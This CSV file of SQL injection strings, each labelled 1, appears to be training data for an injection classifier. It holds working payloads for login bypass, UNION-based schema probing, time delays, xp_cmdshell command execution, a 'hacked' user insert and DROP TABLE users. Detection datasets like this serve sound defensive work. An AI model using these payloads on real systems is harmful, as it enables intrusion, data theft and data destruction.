Sentence,Label
"1"";%20WAITFOR%20DELAY%20""00:00:05""--12 OR 1=1",1
"1'%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1",1
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1",1
"admin"" UNION SELECT NULL,NULL,NULL--/*517 AND 1=1594",1
11' OR 1 = 1/*,1
' OR 1=1#----#184137850,1
1' OR 'a'='a544#-- OR 1=1472,1
user' UNION SELECT NULL-- AND 1=14863,1
admin' OR 1=1#/*120637,1
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1131496 OR 1=1",1
"1"" UNION SELECT NULL----159334593107 AND 1=1 OR 1=1 OR 1=1 OR 1=1",1
' OR 1=1#----# AND 1=1,1
"admin"" UNION SELECT NULL,NULL,NULL--/*517 AND 1=1594--124",1
' OR '1'='1 AND 1=1 OR 1=1,1
';+EXEC+xp_cmdshell('dir')-- AND 1=1 AND 1=1,1
' OR 1=1#/*640,1
"admin"" UNION SELECT NULL,NULL,NULL--/*517",1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--# OR 1=1",1
"admin1"" OR ""1"" = ""1# AND 1=1#785489831",1
ADMIN'/* AND 1=1----,1
"admin"") OR (""1""=""1# OR 1=16014866",1
' or 2=2/* AND 1=1/* AND 1=1,1
"""%20or%201=1/*835 OR 1=1 OR 1=1743",1
2' AND SLEEP(5)--#669,1
"admin"") OR (""1""=""1# OR 1=1/*/*",1
"1'; INSERT INTO users VALUES('hacked','pass')--739##375",1
'/**/or/**/1=1/* AND 1=1 AND 1=1,1
"useradmin"" OR ""1""=""1-- OR 1=1125531",1
1' OR '1'='1' --#412640681798,1
"1"" UNION SELECT NULL----159334593107 AND 1=1 OR 1=1",1
"admin""/**/OR/**/1=1-- OR 1=1 OR 1=1756667",1
user' OR '1'='1#315-- AND 1=1 OR 1=1729,1
1%27%3B%20DROP%20TABLE%20users--/*,1
'%20or%201=1/*835257/* OR 1=1/*,1
admin' UNION ALL SELECT NULL-- AND 1=1--,1
';%20EXEC%20xp_cmdshell('dir')--591 AND 1=1108/*555,1
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1515",1
"""%20or%201=1# AND 1=1 AND 1=1 OR 1=1429",1
' UNION SELECT NULL--/*622/*427/*515146,1
ADMIN'/*172620279,1
') OR ('1'='1/* OR 1=1293408,1
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1----773865",1
user' OR 'a'='a----70,1
